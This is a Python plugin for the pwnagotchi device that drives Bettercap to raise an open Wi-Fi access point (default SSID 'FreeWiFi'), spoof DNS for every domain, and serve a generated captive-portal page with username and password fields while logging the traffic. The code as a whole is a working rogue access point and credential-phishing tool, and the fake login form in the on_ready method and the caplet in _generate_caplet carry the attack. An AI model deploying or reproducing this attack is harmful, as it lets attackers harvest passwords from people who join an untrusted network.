
from pwnagotchi.plugins import BasePlugin
import os
import subprocess
import signal

# this is experimental and not stable

class CaptivePortalBettercap(BasePlugin):
    __author__ = "avipars"
    __version__ = "0.0.1"
    __license__ = "GPL3"
    __github__ = "https://github.com/sponsors/avipars"
    __description__ = "Uses Bettercap to create open AP and captive portal with logging."

    def __init__(self):
        self.process = None
        self.caplet_path = "/root/captive.cap"
        self.portal_folder = "/root/captive_portal/"
        self.portal_log = "/root/portal_logs.txt"

    def on_loaded(self):
        self._log("CaptivePortalBettercap loaded.")

    def on_config_changed(self, config):
        self.options = config['bettercap_captive_portal']
        self._log(f"Config loaded: SSID = {self.options.get('ssid', 'FreeWiFi')}")

    def on_ready(self, agent):
            ssid = self.options.get('ssid', 'FreeWiFi')
            self._generate_caplet(ssid)

            # Ensure portal folder exists
            os.makedirs(self.portal_folder, exist_ok=True)

            # Create a default index.html if none exists
            index_html = os.path.join(self.portal_folder, "index.html")
            if not os.path.exists(index_html):
                with open(index_html, "w") as f:
                    f.write("""
                    <html><body>
                    <h1>Free WiFi Access</h1>
                    <form method='POST'>
                        Username: <input name='user'><br>
                        Password: <input name='pass'><br>
                        <input type='submit'>
                    </form>
                    </body></html>
                    """)

            # Start bettercap
            self._log("Starting Bettercap captive portal...")
            self.process = subprocess.Popen(["bettercap", "-caplet", self.caplet_path])

    def on_unload(self, ui):
        self._log("Stopping captive portal...")
        if self.process:
            self.process.terminate()  # Send SIGTERM
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._log("Bettercap did not terminate gracefully, killing...")
                self.process.kill()
            self.process = None
        self._log("Plugin unloaded.")

    def _log(self, message):
        print(f"[CaptivePortalBettercap] {message}")
        with open(self.portal_log, "a") as f:
            f.write(message + "\n")

    def _generate_caplet(self, ssid):
        caplet_content = f"""
set wifi.ap.ssid "{ssid}"
set wifi.ap.channel 6
set wifi.ap.open true
wifi.recon on
wifi.ap.start

set http.server.address 0.0.0.0
set http.server.port 80
set http.server.path {self.portal_folder}
set http.server.log {self.portal_log}
http.server on

set dns.spoof.domains *
set dns.spoof.address 10.0.0.1
dns.spoof on
"""
        with open(self.caplet_path, "w") as f:
            f.write(caplet_content)
        self._log(f"Caplet generated at {self.caplet_path}")

